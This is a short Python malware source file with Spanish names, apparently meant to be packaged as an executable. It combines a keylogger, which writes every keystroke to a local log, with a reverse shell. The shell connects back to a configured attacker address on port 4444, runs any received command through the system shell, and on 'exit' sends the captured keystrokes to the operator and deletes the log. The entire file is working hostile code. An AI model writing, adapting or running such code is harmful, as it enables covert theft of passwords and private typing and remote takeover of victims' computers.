import socket, subprocess, os
from pynput import keyboard
import threading
import time
import sys

IP_ATTACK = "127.0.0.1"
PORT = 4444
ARCHIVO_LOG = "os_log.txt"

if getattr(sys, 'frozen', False):

    DIRECTORIO_BASE = os.path.dirname(sys.executable)
else:
    DIRECTORIO_BASE = os.path.dirname(os.path.abspath(__file__))

ARCHIVO_LOG = os.path.join(DIRECTORIO_BASE, "os_log.txt")

listener = None

def on_press(key):
    try:
        with open(ARCHIVO_LOG,'a',encoding='utf-8') as f:
            k = str(key).replace("'","")

            if k == "Key.space":
                f.write(' ')
            elif k == 'Key.enter':
                f.write('\n[ENTER]\n')
            elif k == "Key.backspace":
                f.write(' [BORRAR] ')
            elif "Key" in k:
                try:
                    f.write(f' [{k.split(".")[1].upper()}]')
                except:
                    f.write(f' [{k}] ')
            else:
                f.write(k)
    except Exception:
        pass

def iniciar_keylogger():
    with keyboard.Listener(on_press=on_press) as l:
        listener = l
        listener.join()

def init_conexion():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    th = threading.Thread(target=iniciar_keylogger, daemon=True)
    th.start()

    connected = False
    while not connected:
        try:
            s.connect((IP_ATTACK, PORT))
            connected = True
        except:
            time.sleep(2)
        
    while True:
        try:
            comando = s.recv(1024).decode()
            
            if comando.lower() == 'exit':
                content = f"--- LOG DE KEYLOGGER DESDE {IP_ATTACK} ---\n"
    
                if os.path.exists(ARCHIVO_LOG):
                    try:
                        with open(ARCHIVO_LOG,"r",encoding='utf-8') as f:
                            content += f.read()
                        os.remove(ARCHIVO_LOG)
                    except:
                        content += "[Error leyendo el archivo local]"
                else:
                    content += "[El archivo de log no existe o está vacío]"

                s.send(content.encode('utf-8'))
                break 

            if comando.startswith('cd '):
                try:
                    os.chdir(comando[3:].strip())
                    s.send(f"[+] Directorio: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(f"[-] Error path: {str(e)}".encode('utf-8'))
                continue 

            
            resultado = subprocess.run(comando, shell=True, capture_output=True)
            output = resultado.stdout + resultado.stderr
                    
            if not output:
                output = b"[+] Comando ejecutado"
                    
            s.send(output)
            
          
        except Exception:
            break
            
    s.close()

if __name__ == '__main__':
    init_conexion()